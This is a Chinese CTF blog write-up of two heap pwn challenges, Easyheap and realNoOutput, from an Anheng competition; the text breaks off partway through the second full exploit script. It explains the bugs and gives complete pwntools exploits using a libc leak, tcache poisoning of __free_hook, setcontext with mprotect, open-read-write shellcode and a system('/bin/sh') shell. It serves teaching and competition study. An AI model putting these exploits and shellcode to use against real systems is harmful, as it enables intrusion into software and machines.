        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前写了一半的ret2dl的博客还没写完，本来准备边写边学。后面发现涉及的东西有些多，所以还是准备彻底理解了再接着写。最近打了安恒的比赛，这里记录和复现一下这场比赛的pwn。</p><h1 id="Easyheap"><a href="#Easyheap" class="headerlink" title="Easyheap"></a>Easyheap</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>我们先分析一下题目，开始看到main函数开始有一些做初始化的函数，可以看到题目开了沙盒，我们来查看一下</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731105902768.png" alt="ida里发现的沙盒"></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo seccomp-tools dump ./Easyheap </span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731110022532.png" alt="查看开了什么沙盒"></p><p>可以看到我们是不可以执行execve的，那么就只能使用orw来读取我们的flag了</p><p>我们接着分析几个函数</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731151445458.png" alt="add"></p><p>发现add这里存在漏洞，<strong>strdup只会根据你输入的长度来确定malloc的大小和nbytes无关，heap_size的大小只和我们输入的大小nbytes有关，而heap_addr指向的堆是由strdup申请来的，其大小和我们输入的字符串长度有关。</strong></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731151843085.png" alt="show"></p><p>show函数没有什么特殊的，先查看heap里是否有</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731152046694.png" alt="delete"></p><p>delete也一样没有什么特殊的，清空了指针</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731152303249.png" alt="edit"></p><p>edit这里有add函数伏笔回收，如果我们在add时<strong>输入的长度大于我们输入字符串长度</strong>，这里我们就可以<strong>overwrite</strong></p><h2 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h2><p>要想泄露libc的地址我们需要先将chunk放入unsortedbin，题目的libc版本是<em>Ubuntu GLIBC 2.27-3ubuntu1.4</em>所以我们需要先<strong>填满tcache</strong>，然后提前申请好两个chunk，将后面的chunk放入unsorted_bin,通过上面heap的overwrite，来查看libc相对偏移。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)<span class="comment">#0-6</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x90</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;interval&#x27;</span>)<span class="comment">#9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">un_addr=u64(ru(io,<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;un_addr : &#x27;</span>+<span class="built_in">hex</span>(un_addr))</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804181622718.png" alt="填满tcache"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804182003314.png" alt="overwrite"></p><p>得到我们的libc</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804182401716.png" alt="泄露libc"></p><p>将我们可能需要的偏移全部计算出来</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc.address=un_addr-<span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&#x27;libc.address : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">malloc_hook=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;malloc_hook : &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;free_hook : &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">system_addr=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">set_context=libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br></pre></td></tr></table></figure><p>恢复之前overwrite的chunk，否侧无法从中申请到后面的chunk</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804182814206.png" alt="修复chunk"></p><p>我们知道了libc之后现在就可以去<strong>劫持hook</strong>了，我们将之前释放的chunk切割一块出来，再将其放入tcache。接下来再次<strong>通过overwrite来劫持free_hook</strong>，这样free_hook就被放在tcache的链表。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(free_hook)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;free&#x27;</span>)<span class="comment">#free_hook </span></span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804192601094.png" alt="free_hook被放入tcache"></p><p>成功劫持free_hook之后，由于这里开了沙盒所以需要我们做<strong>orw</strong>，首先我们需要一块可以调用写shellocde的地方，所以需要<strong>调用mprotect函数</strong>，在free_hook这一页添加可执行权限，而做到这个需要采用<strong>setcontent</strong>，我们将free_hook，改写为setcontent，这样我们调用free函数就会调用setcontent。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new_addr =  free_hook &amp;<span class="number">0xFFFFFFFFFFFFF000</span></span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">mov rsi, &#123;&#125;</span></span><br><span class="line"><span class="string">mov rdx, 0x1000</span></span><br><span class="line"><span class="string">mov rax, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(new_addr)</span><br><span class="line">edit(<span class="number">1</span>,p64(set_context+<span class="number">53</span>)+p64(free_hook+<span class="number">0x18</span>)*<span class="number">2</span>+asm(shellcode1))</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804194358784.png" alt="free_hook周围值"></p><p>我们再将我们接下来要free的chunk内填上我们需要的值：</p><p>将rsp赋值为我们之前布置好的free_hook+0x18，其指向shellcode，这样setcontent执行完就会跳转到我们的shellcode</p><p>其他的rdi，rsi，rdx，rip，都是为了改写free_hook对应页的权限。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = free_hook+<span class="number">0x10</span></span><br><span class="line">frame.rdi = new_addr</span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">7</span></span><br><span class="line">frame.rip = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">str</span>(frame))</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804195139417.png" alt="image-20210804195139417"></p><p>接下来当setcontent执行完，指针会跳转到我们free_hook附近写下的shellcode中，<strong>shellcode会调用read函数</strong>，会在我们free_hook页让我们写入shellocode并跳转执行。我们写入一个标准的orw即可。这一部分比较模板化，可以记录下来，以后稍加改造就可以再次使用。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">shellcode2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x67616c662f ;// /flag</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rsp ;// /flag</span></span><br><span class="line"><span class="string">mov rsi, 0 ;// O_RDONLY</span></span><br><span class="line"><span class="string">xor rdx, rdx ;</span></span><br><span class="line"><span class="string">mov rax, 2 ;// SYS_open</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rax ;// fd </span></span><br><span class="line"><span class="string">mov rsi,rsp  ;</span></span><br><span class="line"><span class="string">mov rdx, 1024 ;// nbytes</span></span><br><span class="line"><span class="string">mov rax,0 ;// SYS_read</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1 ;// fd </span></span><br><span class="line"><span class="string">mov rsi, rsp ;// buf</span></span><br><span class="line"><span class="string">mov rdx, rax ;// count </span></span><br><span class="line"><span class="string">mov rax, 1 ;// SYS_write</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 0 ;// error_code</span></span><br><span class="line"><span class="string">mov rax, 60</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sl(io,asm(shellcode2))</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./Easyheap&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=gdb.debug(&#x27;./test&#x27;,&#x27;b *0x080492D4&#x27;)</span></span><br><span class="line">one_gadget=[<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./Easyheap&#x27;)</span></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x        : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x        : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p           : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x        : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>   : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b     : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b    : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t        : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x        : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">fake_size,cont</span>):</span></span><br><span class="line">    sla(io,<span class="string">&#x27;&gt;&gt; :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(io,<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(fake_size))</span><br><span class="line">    sa(io,<span class="string">&#x27;Content:&#x27;</span>,cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(io,<span class="string">&#x27;&gt;&gt; :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(io,<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(io,<span class="string">&#x27;&gt;&gt; :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(io,<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,cont</span>):</span></span><br><span class="line">    sla(io,<span class="string">&#x27;&gt;&gt; :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sla(io,<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(io,<span class="string">&#x27;Content:&#x27;</span>,cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x90</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span>)<span class="comment">#0-6</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x90</span>)<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">b&#x27;interval&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">        dele(i)</span><br><span class="line">    dele(<span class="number">8</span>)</span><br><span class="line">    edit(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    un_addr=u64(ru(io,<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    success(<span class="string">&#x27;un_addr : &#x27;</span>+<span class="built_in">hex</span>(un_addr))</span><br><span class="line">    libc.address=un_addr-<span class="number">0x3ebca0</span></span><br><span class="line">    success(<span class="string">&#x27;libc.address : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">    malloc_hook=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    success(<span class="string">&#x27;malloc_hook : &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">    free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    success(<span class="string">&#x27;free_hook : &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">    system_addr=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    set_context=libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">    pause()</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)</span><br><span class="line">    edit(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(free_hook)</span><br><span class="line">    edit(<span class="number">7</span>,payload)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;free&#x27;</span>)<span class="comment">#free_hook 1</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    new_addr =  free_hook &amp;<span class="number">0xFFFFFFFFFFFFF000</span></span><br><span class="line">    shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    mov rsi, &#123;&#125;</span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    jmp rsi</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(new_addr)</span><br><span class="line">    edit(<span class="number">1</span>,p64(set_context+<span class="number">53</span>)+p64(free_hook+<span class="number">0x18</span>)*<span class="number">2</span>+asm(shellcode1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rsp = free_hook+<span class="number">0x10</span></span><br><span class="line">    frame.rdi = new_addr</span><br><span class="line">    frame.rsi = <span class="number">0x1000</span></span><br><span class="line">    frame.rdx = <span class="number">7</span></span><br><span class="line">    frame.rip = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>,<span class="built_in">str</span>(frame))</span><br><span class="line"></span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    shellcode2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f ;// /flag</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rsp ;// /flag</span></span><br><span class="line"><span class="string">    mov rsi, 0 ;// O_RDONLY</span></span><br><span class="line"><span class="string">    xor rdx, rdx ;</span></span><br><span class="line"><span class="string">    mov rax, 2 ;// SYS_open</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rax ;// fd </span></span><br><span class="line"><span class="string">    mov rsi,rsp  ;</span></span><br><span class="line"><span class="string">    mov rdx, 1024 ;// nbytes</span></span><br><span class="line"><span class="string">    mov rax,0 ;// SYS_read</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1 ;// fd </span></span><br><span class="line"><span class="string">    mov rsi, rsp ;// buf</span></span><br><span class="line"><span class="string">    mov rdx, rax ;// count </span></span><br><span class="line"><span class="string">    mov rax, 1 ;// SYS_write</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0 ;// error_code</span></span><br><span class="line"><span class="string">    mov rax, 60</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    sl(io,asm(shellcode2))</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27832</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">pwn()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><h1 id="realNoOutput"><a href="#realNoOutput" class="headerlink" title="realNoOutput"></a>realNoOutput</h1><h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805165752186.png" alt="add"></p><p>这里我们可以看到，<strong>idx的范围是0-9，一共10个chunk</strong>，我们看看它的size数组和addr数组</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805165924643.png" alt="size&amp;addr"></p><p>发现其<strong>size数组大小为8</strong>，说明数组size大小有问题。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805170703356.png" alt="delete"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805170814359.png" alt="edit"></p><p>我们可以看到上图edit函数里如果不执行if函数仍然可以借助栈里残留的值来进行赋值，从而实现uaf</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805170836608.png" alt="show"></p><h2 id="脚本编写-1"><a href="#脚本编写-1" class="headerlink" title="脚本编写"></a>脚本编写</h2><p>我们先来泄露其libc，由于chunk申请出来的时候没有清理内存，所以我们可以将放在unsorted_bin中的chunk申请出来，得到libc基地址。先填满tcache</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x100</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    dele(<span class="number">7</span>-i)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>,<span class="string">b&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">un_addr=u64(ru(io,<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;un_addr : &#x27;</span>+<span class="built_in">hex</span>(un_addr))</span><br><span class="line">libc.address=un_addr-<span class="number">0x1ebce0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805163202933.png" alt="获取基地址"></p><p>再泄露一些我们需要的函数地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system : &#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;free_hook : &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br></pre></td></tr></table></figure><p>接下来需要的就是劫持free_hook来获取shell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure><p>chunk1和2是为了填充tcache，chunk3是为了后面劫持free_hook到system作为参数使用的。</p><p>至于chunk8是为了将chunk0的heap_addr赋值，由于数组越界，我们的chunk8的size会作为chunk0的地址使用。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805205403681.png" alt="addr数组"></p><p>接下来我们就要劫持free_hook了，先将free_hook放在tcache的链表上</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(free_hook))</span><br></pre></td></tr></table></figure><p>这里edit的地址并不是chunk0的而是已经被free的chunk2遗留在栈上的，所以这里构造了一个uaf。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805205633751.png" alt="劫持free_hook"></p><p>剩下的事情就简单了我们将free_hook申请出来，将其修改为system的地址，然后delete之前准备好写有”/bin/sh\x00”的堆块，即可拿取shell。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">dele(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./realNoOutput&quot;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;node4.buuoj.cn&#x27;,27832)</span></span><br><span class="line"><span class="comment">#io=gdb.debug(&#x27;./test&#x27;,&#x27;b *0x080492D4&#x27;)</span></span><br><span class="line"><span class="comment">#one_gadget=[0x4f3d5,0x4f432,0x10a41c]</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./realNoOutput&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;node4.buuoj.cn&#x27;,29826)</span></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x        : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x        : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p           : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x        : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>   : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b     : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b    : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t        : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x        : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,cont</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,cont)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,cont</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,cont)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x100</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    dele(<span 